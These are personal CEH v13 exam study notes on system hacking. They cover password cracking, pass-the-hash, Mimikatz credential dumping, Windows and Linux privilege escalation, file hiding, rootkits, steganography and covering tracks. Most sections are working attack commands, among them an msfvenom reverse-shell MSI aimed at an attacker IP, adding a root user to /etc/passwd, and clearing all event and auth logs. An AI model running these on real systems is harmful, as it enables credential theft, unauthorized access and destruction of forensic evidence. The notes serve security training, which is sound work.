# 💻 CEH v13 — Module 06: System Hacking

> 📌 Personal study notes for CEH v13 exam preparation. Covers password cracking, privilege escalation, maintaining access, and covering tracks — the four goals of system hacking.

---

## 📚 Table of Contents

1. [Overview](#overview)
2. [4 Goals of System Hacking](#4-goals-of-system-hacking)
3. [Password Cracking](#password-cracking)
4. [Escalating Privileges](#escalating-privileges)
5. [Executing Applications](#executing-applications)
6. [Hiding Files](#hiding-files)
7. [Rootkits](#rootkits)
8. [Steganography](#steganography)
9. [Covering Tracks](#covering-tracks)
10. [Tools Summary](#tools-summary)
11. [CEH Exam Tips](#ceh-exam-tips)

---

## 🧭 Overview

### Where System Hacking Fits

```
Phase 1 → Footprinting & Reconnaissance
Phase 2 → Scanning Networks
Phase 3 → Enumeration
Phase 4 → Vulnerability Analysis
Phase 5 → System Hacking   ← We are here
Phase 6 → Malware Threats
```

**System Hacking = gaining unauthorized access and maintaining it.**

---

## 🎯 4 Goals of System Hacking

```
1. PASSWORD CRACKING    → Gain initial access
        ↓
2. PRIVILEGE ESCALATION → Get higher permissions (admin/root)
        ↓
3. MAINTAINING ACCESS   → Stay in the system (backdoors, rootkits)
        ↓
4. COVERING TRACKS      → Erase evidence of compromise
```

> 💡 **Exam Tip:** These 4 goals always appear in this exact order — memorize the sequence!

---

## 🔑 Password Cracking

### Password Attack Types

| Attack Type | Description |
|---|---|
| **Dictionary Attack** | Tries words from a wordlist |
| **Brute Force Attack** | Tries every possible combination |
| **Hybrid Attack** | Dictionary + brute force (adds numbers/symbols) |
| **Rule-Based Attack** | Applies transformation rules to wordlist |
| **Rainbow Table Attack** | Uses precomputed hash→password tables |
| **Pass the Hash (PtH)** | Uses captured NTLM hash directly — no cracking needed |
| **Password Spraying** | One common password tried against many accounts |
| **Credential Stuffing** | Uses leaked username:password pairs |

### Password Storage

| OS | Storage Location | Hash Type |
|---|---|---|
| Windows (old) | SAM database (`C:\Windows\System32\config\SAM`) | LM / NTLM |
| Windows (domain) | NTDS.dit (Domain Controller) | NTLM |
| Linux | `/etc/shadow` | SHA-512 / bcrypt |

> 💡 **Exam Tip:** LM hash is weak (splits password into two 7-char chunks). NTLM is stronger. Linux `/etc/shadow` requires root to read.

### Offline Password Cracking Commands

```bash
# Hashcat — GPU-based password cracker
hashcat -m 0 hash.txt wordlist.txt              # MD5
hashcat -m 1000 hash.txt wordlist.txt           # NTLM
hashcat -m 1800 hash.txt wordlist.txt           # SHA-512 (Linux)
hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a     # Brute force NTLM
hashcat -m 1000 -a 0 -r rules/best64.rule hash.txt wordlist.txt  # Rule-based

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=NT hash.txt                       # NTLM hashes
john --format=sha512crypt shadow.txt            # Linux shadow
john --show hash.txt                            # Show cracked passwords
john --rules --wordlist=wordlist.txt hash.txt   # With rules

# Unshadow — combine passwd + shadow for John
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

### Online / Network Password Attacks

```bash
# Hydra — network login brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
hydra -l admin -P wordlist.txt ftp://192.168.1.1
hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -P wordlist.txt rdp://192.168.1.1
hydra -l admin -P wordlist.txt smb://192.168.1.1

# Medusa
medusa -h 192.168.1.1 -u admin -P wordlist.txt -M ssh
medusa -h 192.168.1.1 -u admin -P wordlist.txt -M ftp

# Ncrack
ncrack -p 22 --user admin -P wordlist.txt 192.168.1.1
```

### Rainbow Table Attack

```bash
# Ophcrack — Windows password cracker using rainbow tables
# GUI tool — load SAM file + rainbow tables → auto-cracks

# RainbowCrack
rcrack . -h <hash>
rcrack . -l hashlist.txt
```

### Pass the Hash (PtH)

```bash
# Using Impacket
python3 psexec.py -hashes :NTLM_HASH administrator@192.168.1.1

# Using CrackMapExec
crackmapexec smb 192.168.1.1 -u administrator -H NTLM_HASH

# Using Metasploit
use exploit/windows/smb/psexec
set SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
```

### Extracting Windows Hashes

```bash
# Mimikatz (on compromised Windows system)
privilege::debug
sekurlsa::logonpasswords        # Dump plaintext passwords + hashes
sekurlsa::wdigest               # WDigest credentials
lsadump::sam                    # SAM database hashes
lsadump::dcsync /user:administrator  # DCSync attack

# Metasploit — hashdump
meterpreter > hashdump
meterpreter > run post/windows/gather/credentials/credential_collector
```

---

## ⬆️ Escalating Privileges

### Types of Privilege Escalation

| Type | Description |
|---|---|
| **Horizontal** | Same privilege level — access another user's account |
| **Vertical** | Lower → Higher privilege (user → admin/root) |

### Windows Privilege Escalation

```bash
# Check current user & privileges
whoami
whoami /priv
whoami /groups
net user
net localgroup administrators

# Common Windows PrivEsc techniques

# 1. Unquoted Service Path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# 2. Weak Service Permissions
accesschk.exe -uwcqv "Everyone" *
sc config VulnService binpath= "C:\evil.exe"
sc start VulnService

# 3. AlwaysInstallElevated (MSI runs as SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

# 4. Token Impersonation (Metasploit)
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"

# 5. Bypass UAC
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_fodhelper
```

### Linux Privilege Escalation

```bash
# Check current user
id
whoami
sudo -l                         # What can we run as sudo?

# SUID binaries — run as file owner (often root)
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd
# If writable — add new root user:
echo 'hacker:$(openssl passwd hacked):0:0:root:/root:/bin/bash' >> /etc/passwd

# Cron jobs running as root
cat /etc/crontab
ls -la /etc/cron*
# If cron script is writable:
echo "chmod +s /bin/bash" >> /path/to/cron_script.sh

# Kernel exploits
uname -a                        # Check kernel version
searchsploit linux kernel 4.4   # Find exploits

# sudo misconfiguration
sudo -l
# If (ALL) NOPASSWD: /bin/vim → sudo vim → :!/bin/bash

# LinPEAS — automated Linux PrivEsc checker
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# WinPEAS — Windows version
.\winPEAS.exe
```

---

## ⚙️ Executing Applications

After gaining access, attackers execute malicious applications:

| Method | Description |
|---|---|
| **RemoteExec** | Execute programs on remote systems |
| **PDQ Deploy** | Mass software deployment (can be abused) |
| **Metasploit** | Execute payloads via exploits |
| **PsExec** | Sysinternals tool — remote command execution |
| **WMI** | Windows Management Instrumentation — remote execution |
| **PowerShell Remoting** | Execute PS commands remotely |

```bash
# PsExec — remote command execution
psexec \\192.168.1.1 -u admin -p password cmd.exe
psexec \\192.168.1.1 -u admin -p password ipconfig

# WMI remote execution
wmic /node:192.168.1.1 /user:admin /password:pass process call create "cmd.exe /c whoami > C:\output.txt"

# PowerShell remote execution
Invoke-Command -ComputerName 192.168.1.1 -ScriptBlock { whoami }

# Metasploit — execute commands
meterpreter > execute -f cmd.exe -i -H
meterpreter > shell
```

---

## 🙈 Hiding Files

### Windows — Hiding Files

```bash
# Attribute hiding
attrib +h +s secret.txt         # Hide file (hidden + system)
attrib -h -s secret.txt         # Unhide file
dir /a:h                        # Show hidden files

# Alternate Data Streams (ADS) — NTFS feature
# Hide data inside another file's stream
echo "malicious payload" > legit.txt:hidden.txt
more < legit.txt:hidden.txt

# List ADS streams
dir /r
streams.exe legit.txt           # Sysinternals streams tool

# Execute from ADS
wscript legit.txt:hidden.vbs
```

### Linux — Hiding Files

```bash
# Files starting with . are hidden
mv secret.txt .secret.txt
ls -la                          # Shows hidden files

# Hide in /tmp or /dev/shm
cp malware /tmp/.malware
cp malware /dev/shm/.hidden

# Timestomping — change file timestamps
touch -t 202001010000 malware.sh    # Set to Jan 1, 2020
```

---

## 🦠 Rootkits

A **rootkit** is malware that hides its presence and provides persistent privileged access.

### Types of Rootkits

| Type | Level | Description |
|---|---|---|
| **Hypervisor Rootkit** | Hardware | Runs below OS — creates virtual machine for OS |
| **Kernel-Level Rootkit** | Kernel | Modifies OS kernel — hardest to detect |
| **Boot-Level (Bootkit)** | Boot | Infects MBR/bootloader — loads before OS |
| **Library-Level** | OS | Replaces system libraries (DLL injection) |
| **Application-Level** | Application | Modifies legitimate application binaries |
| **Memory-Based** | Memory | Exists only in RAM — gone after reboot |

> 💡 **Exam Tip:** Kernel-level rootkits are hardest to detect. Hypervisor rootkits are hardest to remove. Memory-based rootkits don't survive reboot.

### Detecting Rootkits

```bash
# chkrootkit — Linux rootkit detector
sudo chkrootkit

# rkhunter — Rootkit Hunter
sudo rkhunter --check
sudo rkhunter --update

# GMER — Windows rootkit detector (GUI)
# Sophos Anti-Rootkit
# Windows Defender Offline Scan
```

### Rootkit Removal
- **Best method:** Reinstall OS from clean media
- Rootkits cannot always be fully removed without OS reinstall
- Boot from Live CD/USB to scan without loading infected OS

---

## 🖼️ Steganography

**Steganography** = hiding secret data inside ordinary files (images, audio, video, text).

### Types

| Type | Carrier File | Tool |
|---|---|---|
| **Image Steganography** | JPG, PNG, BMP | Steghide, OpenStego |
| **Audio Steganography** | MP3, WAV | MP3Stego, DeepSound |
| **Video Steganography** | MP4, AVI | OpenPuff |
| **Text Steganography** | TXT, HTML | SNOW (whitespace) |
| **Document Steganography** | DOCX, PDF | — |

```bash
# Steghide — embed and extract
steghide embed -cf image.jpg -sf secret.txt -p password
steghide extract -sf image.jpg -p password
steghide info image.jpg         # Check if data is hidden

# StegSolve — analyze images for hidden data (Java GUI)
java -jar StegSolve.jar

# Binwalk — detect hidden files inside files
binwalk image.jpg
binwalk -e image.jpg            # Extract embedded files

# ExifTool — check/edit metadata
exiftool image.jpg
exiftool -all= image.jpg        # Remove all metadata

# zsteg — detect hidden data in PNG/BMP
zsteg image.png
```

> 💡 **Exam Tip:** Steganography ≠ Cryptography. Crypto hides the content. Stego hides the existence of the message.

---

## 🧹 Covering Tracks

Attackers erase evidence to avoid detection and forensic investigation.

### Windows — Clearing Logs

```bash
# Clear Event Logs (CMD)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil el                     # List all event logs
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"  # Clear ALL

# PowerShell — clear logs
Clear-EventLog -LogName System
Clear-EventLog -LogName Security
Get-EventLog -List | Clear-EventLog

# Metasploit — clear logs
meterpreter > clearev

# Disable audit logging (before attack)
auditpol /set /category:* /success:disable /failure:disable
```

### Linux — Clearing Logs

```bash
# Clear bash history
history -c
history -w
unset HISTFILE                  # Disable history for session
export HISTSIZE=0

# Clear log files
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
cat /dev/null > /var/log/auth.log

# Shred log file (overwrite + delete)
shred -zu /var/log/auth.log

# Last login records
echo "" > /var/log/lastlog
echo "" > /var/log/wtmp
echo "" > /var/log/btmp

# Disable logging in bash
export HISTFILE=/dev/null
```

### Timestomping — Modify File Timestamps

```bash
# Linux — change timestamps
touch -t 202001010000.00 malware.sh    # Change to Jan 1, 2020

# Metasploit — timestomp
meterpreter > timestomp C:\\malware.exe -f C:\\Windows\\explorer.exe
meterpreter > timestomp C:\\malware.exe -z "01/01/2020 00:00:00"
```

### Other Covering Track Techniques

| Technique | Description |
|---|---|
| **Disable Firewall Logging** | Turn off logging before attack |
| **Use Encrypted Channels** | HTTPS, SSH tunnels hide traffic content |
| **Proxy/VPN/Tor** | Hide source IP |
| **Delete Prefetch Files** | Windows tracks executed programs in prefetch |
| **Clear Recycle Bin** | Remove deleted file traces |
| **Secure Delete** | Overwrite files before deletion |

```bash
# Delete Windows prefetch
del /f /q C:\Windows\Prefetch\*.pf

# Secure delete (Linux)
shred -zu sensitive_file.txt
wipe sensitive_file.txt

# Windows — cipher (overwrite free space)
cipher /w:C:\
```

---

## 🧰 Tools Summary

| Tool | Category | Purpose |
|---|---|---|
| **Hashcat** | Password Cracking | GPU-accelerated hash cracking |
| **John the Ripper** | Password Cracking | CPU-based hash cracking |
| **Hydra** | Password Cracking | Network login brute force |
| **Mimikatz** | Credential Dumping | Extract Windows passwords/hashes |
| **Ophcrack** | Password Cracking | Rainbow table Windows cracking |
| **Metasploit** | Exploitation | Exploit + post-exploitation |
| **PsExec** | Remote Execution | Execute commands remotely |
| **LinPEAS/WinPEAS** | Privilege Escalation | Automated PrivEsc enumeration |
| **chkrootkit** | Rootkit Detection | Linux rootkit scanner |
| **rkhunter** | Rootkit Detection | Linux rootkit hunter |
| **Steghide** | Steganography | Hide/extract data in images |
| **Binwalk** | Stego Analysis | Detect files within files |
| **GMER** | Rootkit Detection | Windows rootkit detector |

---

## 📝 CEH Exam Tips

### ⭐ Must-Know for Exam

1. **4 Goals in order:** Password Cracking → Privilege Escalation → Maintaining Access → Covering Tracks
2. **Pass the Hash** = no cracking needed, use NTLM hash directly
3. **LM hash** = weak (splits into two 7-char halves) | **NTLM** = stronger
4. **Mimikatz** = dumps Windows credentials from LSASS memory
5. **SUID bit** = runs file as owner (root) — Linux PrivEsc vector
6. **ADS (Alternate Data Streams)** = hide data in NTFS file streams
7. **Kernel rootkit** = hardest to detect | **Memory rootkit** = doesn't survive reboot
8. **Steganography ≠ Cryptography** — stego hides existence, crypto hides content
9. **clearev** in Metasploit = clears Windows event logs
10. **Timestomping** = changing file timestamps to avoid forensic detection
11. **Horizontal PrivEsc** = same level, different user | **Vertical PrivEsc** = lower → higher

### Password Attack Quick Reference

| Attack | Needs | Speed |
|---|---|---|
| Dictionary | Wordlist | Fast |
| Brute Force | Nothing | Slow |
| Hybrid | Wordlist + rules | Medium |
| Rainbow Table | Precomputed tables | Very Fast |
| Pass the Hash | NTLM hash | Instant |
| Password Spraying | One password | Slow (avoids lockout) |

### Rootkit Types — Quick Recall

```
Hypervisor → Hardware level (below OS)
Kernel     → OS kernel level (hardest to detect)
Boot       → MBR/bootloader
Library    → DLL/shared libraries
App        → Application binaries
Memory     → RAM only (non-persistent)
```

---

## 🔗 References

- CEH v13 Official Courseware — Module 06
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Hashcat Documentation](https://hashcat.net/wiki/)
- [GTFOBins — Linux PrivEsc](https://gtfobins.github.io/)
- [LOLBAS — Windows PrivEsc](https://lolbas-project.github.io/)
- [PayloadsAllTheThings — PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

*Notes prepared by Vaishnavi Trivedi | CEH v13 Exam Prep | github.com/Vaishnavi-07823*
